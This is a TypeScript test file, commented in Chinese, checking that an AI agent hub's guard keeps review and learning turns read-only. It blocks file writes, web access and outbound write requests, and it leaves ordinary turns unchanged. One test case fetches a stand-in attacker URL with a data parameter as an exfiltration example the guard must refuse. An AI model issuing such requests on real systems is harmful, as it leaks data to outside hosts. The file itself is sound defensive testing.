/**
 * P75r6 第 1 节：技能类回合真正只读（复验 N1）。
 *
 * 技能类回合指复盘、核对、改写、学习、每周整理。它们读的文字里有模型写的内容，学习回合读的还是主人会话的摘要（外部内容），
 * 所以这些回合只能读、调用 hub_skill、交账。五种回合各试一遍：
 * - 写家目录下的文件、写共享目录下的文件、web_fetch、web_search 被拒（自己的工具）；
 * - hub_outbox_submit 的 write_file 整个被拒；
 * - 读文件、只读命令放行；该用的 hub_skill 动作和交账照常成功（只用唤醒包里的文字）；
 * - 越界次数不变、不建审批、不建出站记录、文件没有写出来。
 * 反例：普通回合里这些动作照旧。
 */
import { describe, expect, it } from 'vitest';
import { guardToolCall } from '../src/gate/guard.js';
import { REFLECTION_NOTIFY_REFUSAL } from '../src/gate/outbox.js';
import { started } from './p74d-fixtures.js';
import { SKILL_TURN_KINDS, bot, callTool, doTheStep, openTurn, type SkillTurnKind } from './p75r6-fixtures.js';

/** 技能类回合里自己的工具被拒的文字（沿用原来的只读拒绝文字）。 */
const READONLY_REFUSAL = '复盘回合只读，不能执行需要审批的动作';
/** hub_outbox_submit 被拒的文字（沿用原来的只读拒绝文字）。 */
const OUTBOX_REFUSAL = '复盘回合只读，不执行对外动作';

const LABELS: Record<SkillTurnKind, string> = { learn: '学习', retro: '复盘', check: '核对', rewrite: '改写', tidy: '整理' };

describe('技能类回合：自己的工具与出站只读（五种回合各一遍）', () => {
  for (const kind of SKILL_TURN_KINDS) {
    it(`${LABELS[kind]}回合：写家目录、写共享目录、联网、出站写文件被拒；读与只读命令放行；该用的 hub_skill 动作与交账照常成功；越界次数不变`, async () => {
      const turn = await openTurn(kind);
      const { fix } = turn;
      const who = () => bot(fix, turn.botId);
      const sid = who().sessionId!;
      const home = who().homeDir;
      const shared = `${fix.ctx.settings.rootDir}/shared`;
      const violations = who().violations;
      const approvals = fix.ctx.store.table('approvals').count();
      const outbox = fix.ctx.store.table('outbox').count();

      // 1：自己的工具写家目录下的文件（write、edit、命令里的重定向都算）：拒绝，文字沿用原来的只读拒绝文字。
      for (const [tool, args] of [
        ['write', { path: `${home}/work/note.md`, content: '内容' }],
        ['edit', { path: `${home}/work/note.md`, old_string: 'a', new_string: 'b' }],
        ['exec', { command: 'touch work/note.md' }],
      ] as const) {
        expect(await guardToolCall(fix.ctx, sid, tool, args), `家目录 ${tool}`).toEqual({ allow: false, message: READONLY_REFUSAL });
      }
      // 2：写共享目录下的文件：拒绝。
      expect(await guardToolCall(fix.ctx, sid, 'write', { path: `${shared}/note.md`, content: '内容' }), '共享目录 write').toEqual({ allow: false, message: READONLY_REFUSAL });
      // 3：联网：web_fetch（GET 也不行）、web_search 被拒。
      expect(await guardToolCall(fix.ctx, sid, 'web_fetch', { url: 'https://attacker.example/c?d=1' }), 'web_fetch').toEqual({ allow: false, message: READONLY_REFUSAL });
      expect(await guardToolCall(fix.ctx, sid, 'web_search', { query: '某个关键词' }), 'web_search').toEqual({ allow: false, message: READONLY_REFUSAL });
      // 4：hub_outbox_submit 的 write_file 整个被拒（家目录、共享目录各一条），不建出站记录；notify_owner 的拒绝文字不变。
      for (const path of [`${home}/work/note.md`, `${shared}/note.md`]) {
        const refused = await callTool(fix, who(), 'hub_outbox_submit', { kind: 'write_file', why: '记一笔', payload: { path, content: '内容' } });
        expect(refused, path).toEqual({ ok: false, error: OUTBOX_REFUSAL });
      }
      const notify = await callTool(fix, who(), 'hub_outbox_submit', { kind: 'notify_owner', why: '通知', payload: { text: '嗨', importance: 10 } });
      expect(JSON.stringify(notify)).toContain(REFLECTION_NOTIFY_REFUSAL);
      expect(fix.ctx.store.table('outbox').count()).toBe(outbox);
      // 5：读文件、只读命令放行；DSH 的 skill 工具（只读）放行。
      expect((await guardToolCall(fix.ctx, sid, 'exec', { command: 'ls work' })).allow, '只读命令').toBe(true);
      expect((await guardToolCall(fix.ctx, sid, 'read_file', { path: `${home}/work/note.md` })).allow, '读文件').toBe(true);
      expect((await guardToolCall(fix.ctx, sid, 'skill', { name: 'whatever' })).allow, 'skill 工具').toBe(true);
      // 以上被拒的动作都不计越界、不建审批。
      expect(who().violations).toBe(violations);
      expect(fix.ctx.store.table('approvals').count()).toBe(approvals);
      // 6：该用的 hub_skill 动作（只用唤醒包里的文字）与交账照常成功。
      await doTheStep(turn);
      expect(who().violations).toBe(violations);
    });
  }

  it('反例：普通回合（执行者做一件事的回合）里同样的动作照旧放行', async () => {
    const { fix } = await started();
    const who = () => bot(fix, fix.engineer.id);
    const sid = who().sessionId!;
    const home = who().homeDir;
    const shared = `${fix.ctx.settings.rootDir}/shared`;
    expect((await guardToolCall(fix.ctx, sid, 'write', { path: `${home}/work/note.md`, content: '内容' })).allow, '家目录 write').toBe(true);
    expect((await guardToolCall(fix.ctx, sid, 'exec', { command: 'touch work/note.md' })).allow, '家目录 exec 写').toBe(true);
    expect((await guardToolCall(fix.ctx, sid, 'write', { path: `${shared}/note.md`, content: '内容' })).allow, '共享目录 write').toBe(true);
    expect((await guardToolCall(fix.ctx, sid, 'web_fetch', { url: 'https://example.com/docs' })).allow, 'web_fetch').toBe(true);
    expect((await guardToolCall(fix.ctx, sid, 'web_search', { query: '某个关键词' })).allow, 'web_search').toBe(true);
    const submitted = await callTool(fix, who(), 'hub_outbox_submit', { kind: 'write_file', why: '记一笔', payload: { path: `${home}/work/out.md`, content: '内容' } });
    expect(submitted, JSON.stringify(submitted)).toMatchObject({ ok: true });
  });

  it('中心工具名单：技能类回合里写类的中心工具照旧被拒，读取类与交账、hub_skill 不受影响', async () => {
    const turn = await openTurn('retro');
    const { fix } = turn;
    const who = bot(fix, turn.botId);
    const refusal = { ok: false, error: '反思回合只读；其他事项留到下一回合' };
    expect(await callTool(fix, who, 'hub_agenda_upsert', { kind: 'task', title: '复核一条来源', abandonWhen: '来源撤回', priority: 2 })).toEqual(refusal);
    expect(await callTool(fix, who, 'hub_send', { to: fix.chief.id, text: '嗨' })).toEqual(refusal);
    for (const readTool of ['hub_state_get', 'hub_task_list']) {
      expect(await callTool(fix, who, readTool, {}), readTool).not.toEqual(refusal);
    }
  });
});
